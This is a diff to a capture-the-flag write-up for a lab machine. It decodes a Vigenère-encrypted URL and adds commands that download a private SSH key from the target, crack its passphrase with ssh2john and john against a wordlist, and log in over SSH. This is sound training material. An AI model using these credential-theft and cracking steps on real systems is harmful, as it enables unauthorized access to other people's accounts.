@@ -493,7 +493,7 @@ Orestis - Hacking for fun and profit -> Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
 + Find out the key using [Vigenère cipher](https://planetcalc.com/2468/):
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d44c7045-3017-488b-9470-a296e88e9c36)
 
-+ Crack the 'mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja'. It looks like a url.
++ Crack the `mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja`. It looks like a url.
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/38fe4034-b7a5-4363-a5b0-ae2ce8317df4)
 
 + Alternatively using [Vigenere-Cipher-Key-Finder](https://github.com/4st1nus/Vigenere-Cipher-Key-Finder):
@@ -513,7 +513,15 @@ ckmybrainfuckmybrainfuckmybra
 
 + Alternatively, you can use [CyberChef](https://gchq.github.io/CyberChef/): [find the key](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('OrestisHackingforfunandprofit')&input=UGllYWdubSAtIEprb2lqZWcgbmJ3IHp3eCBtbGUgZ3J3c25u) and [decode ssh url](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('fuckmybrain')&input=bW52emU6Ly96c3JpdnN6d20ucmZ6LzhjcjVhaTEwcjkxNTIxODY5N2kxdzY1OGVucWMwY3M4L296cnhua2MvdWJfc2ph). In same the way [boxentriq](https://www.boxentriq.com/code-breaking/vigenere-cipher).
 
-+ Get the `id_rsa_key`: `curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -k`
++ Get the `id_rsa_key`: `curl https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -ks -o id_rsa`
++ Change the permissions on id_rsa: `chmod 600 id_rsa`
++ Generate a hash from the key using ssh2john.py: `ssh2john id_rsa > id_rsa.hash` 
++ And then crack it with john: `john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/196769e8-4de0-4ec1-8a18-488642546b30)
+
++ Show password: `john --show id_rsa.hash` and login ssh: `ssh -i id_rsa orestis@brainfuck.htb`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b6687895-60f3-4764-b1e9-d766076f5b07)
+
 
 
 ## Tools
